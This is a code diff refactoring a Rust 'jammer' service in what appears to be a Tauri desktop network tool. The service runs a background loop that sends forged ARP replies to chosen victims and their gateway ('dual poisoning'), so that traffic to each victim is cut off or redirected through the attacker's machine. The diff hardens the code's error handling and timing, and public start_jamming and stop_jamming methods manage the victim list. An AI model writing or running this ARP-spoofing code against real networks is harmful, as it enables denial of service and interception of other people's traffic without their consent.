@@ -1,3 +1,5 @@
+// src-tauri/src/application/jammer_service.rs
+
 use crate::infrastructure::network::packet_injector::PacketInjector;
 use crate::infrastructure::repositories::local_intelligence;
 use pnet::datalink;
@@ -5,6 +7,7 @@ use pnet::util::MacAddr;
 use std::collections::HashMap;
 use std::net::Ipv4Addr;
 use std::str::FromStr;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
@@ -18,105 +21,118 @@ struct Target {
 
 pub struct JammerService {
     active_targets: Arc<Mutex<HashMap<String, Target>>>,
-    running: Arc<Mutex<bool>>,
+    running: Arc<AtomicBool>,
 }
 
 impl JammerService {
     pub fn new() -> Self {
         let service = Self {
             active_targets: Arc::new(Mutex::new(HashMap::new())),
-            running: Arc::new(Mutex::new(true)),
+            running: Arc::new(AtomicBool::new(true)),
         };
         service.start_attack_loop();
         service
     }
 
     fn start_attack_loop(&self) {
-        let targets_clone = self.active_targets.clone();
-        let running_clone = self.running.clone();
+        let targets_clone = Arc::clone(&self.active_targets);
+        let running_clone = Arc::clone(&self.running);
 
         thread::spawn(move || {
-            loop {
-                if !*running_clone.lock().unwrap() { break; }
-
-                let has_targets = !targets_clone.lock().unwrap().is_empty();
-
-                if !has_targets {
-                    thread::sleep(Duration::from_millis(1000));
-                    continue;
-                }
-
-                if let Ok(identity) = local_intelligence::get_host_identity() {
-                    let interfaces = datalink::interfaces();
-                    let interface = interfaces.into_iter().find(|iface| {
-                         iface.ips.iter().any(|ip| ip.ip().to_string() == identity.ip)
-                    });
-
-                    if let Some(iface) = interface {
-                        // Obtenim la nostra MAC
-                        let my_mac = iface.mac.unwrap(); 
-                        
-                        let targets = targets_clone.lock().unwrap().clone();
-
-                        // 🔥 DISPAREM RÀPID I EN DUES DIRECCIONS (Dual Poisoning)
-                        for (_, target) in &targets {
-                            // Convertim Strings a Tipus de Xarxa
-                            let target_ip = Ipv4Addr::from_str(&target.ip).unwrap();
-                            let gateway_ip = Ipv4Addr::from_str(&target.gateway_ip).unwrap();
-                            
-                            // Parse MAC manualment o amb helper
-                            let target_mac = PacketInjector::parse_mac(&target.mac);
-                            
-                            // 1. ENGANYEM A LA VÍCTIMA ("Sóc el Router")
-                            PacketInjector::send_fake_arp(
-                                &iface, 
-                                target_mac, 
-                                target_ip, 
-                                my_mac, 
-                                gateway_ip
-                            );
-
-                            // 2. ENGANYEM AL ROUTER ("Sóc la Víctima")
-                            // Com que no tenim la MAC del Router, enviem a Broadcast Ethernet
-                            // però l'ARP Packet va dirigit a la IP del Router
-                            let broadcast_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
-                            
-                            PacketInjector::send_fake_arp(
-                                &iface,
-                                broadcast_mac, 
-                                gateway_ip,    // Target IP (Router)
-                                my_mac,        // Sender MAC (Jo)
-                                target_ip      // Sender IP (Víctima - Mentida!)
-                            );
-                        }
+            while running_clone.load(Ordering::Relaxed) {
+                let targets = {
+                    let Ok(lock) = targets_clone.lock() else {
+                        thread::sleep(Duration::from_millis(200));
+                        continue;
+                    };
+                    if lock.is_empty() {
+                        thread::sleep(Duration::from_millis(1000));
+                        continue;
                     }
+                    lock.clone()
+                };
+
+                let identity = match local_intelligence::get_host_identity() {
+                    Ok(id) => id,
+                    Err(_) => {
+                        thread::sleep(Duration::from_millis(500));
+                        continue;
+                    }
+                };
+
+                let interfaces = datalink::interfaces();
+                let interface = interfaces.into_iter().find(|iface| {
+                    iface.ips.iter().any(|ip| ip.ip().to_string() == identity.ip)
+                });
+
+                let Some(iface) = interface else {
+                    thread::sleep(Duration::from_millis(500));
+                    continue;
+                };
+
+                let Some(my_mac) = iface.mac else {
+                    thread::sleep(Duration::from_millis(500));
+                    continue;
+                };
+
+                for (_, target) in &targets {
+                    let Ok(target_ip) = Ipv4Addr::from_str(&target.ip) else {
+                        continue;
+                    };
+                    let Ok(gateway_ip) = Ipv4Addr::from_str(&target.gateway_ip) else {
+                        continue;
+                    };
+
+                    let target_mac = PacketInjector::parse_mac(&target.mac);
+                    if target_mac == MacAddr::zero() {
+                        continue;
+                    }
+
+                    // Enviamos ARP Reply falsificado al objetivo (poisoning).
+                    PacketInjector::send_fake_arp(&iface, target_mac, target_ip, my_mac, gateway_ip);
+
+                    // Segundo envio: al gateway, usando broadcast ethernet (best-effort).
+                    let broadcast_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
+                    PacketInjector::send_fake_arp(&iface, broadcast_mac, gateway_ip, my_mac, target_ip);
                 }
-                // ⚡ VELOCITAT D'ATAC: 200ms
-                thread::sleep(Duration::from_millis(200));
+
+                // Cadencia conservadora para no saturar el host local.
+                thread::sleep(Duration::from_millis(250));
             }
         });
     }
-    
 
     pub fn start_jamming(&self, target_ip: String, target_mac: String, gateway_ip: String) {
-        let mut lock = self.active_targets.lock().unwrap();
-        println!("💀 [JAMMER] TARGET ACQUIRED: {} (Spoofing Gateway: {})", target_ip, gateway_ip);
-        lock.insert(target_ip.clone(), Target { ip: target_ip, mac: target_mac, gateway_ip });
+        let Ok(mut lock) = self.active_targets.lock() else {
+            return;
+        };
+        println!(
+            "💀 [JAMMER] Objetivo registrado: {} (gateway: {})",
+            target_ip, gateway_ip
+        );
+        lock.insert(
+            target_ip.clone(),
+            Target {
+                ip: target_ip,
+                mac: target_mac,
+                gateway_ip,
+            },
+        );
     }
 
     pub fn stop_jamming(&self, target_ip: String) {
-        let mut lock = self.active_targets.lock().unwrap();
+        let Ok(mut lock) = self.active_targets.lock() else {
+            return;
+        };
         if lock.remove(&target_ip).is_some() {
-            println!("🏳️ [JAMMER] CEASE FIRE: {}", target_ip);
+            println!("🏳️ [JAMMER] Objetivo eliminado: {}", target_ip);
         }
     }
 }
 
 impl Drop for JammerService {
     fn drop(&mut self) {
-        if let Ok(mut running) = self.running.lock() {
-            *running = false;
-        }
+        self.running.store(false, Ordering::Relaxed);
     }
 }
 
@@ -152,3 +168,4 @@ mod tests {
         assert!(lock.is_empty());
     }
 }
+
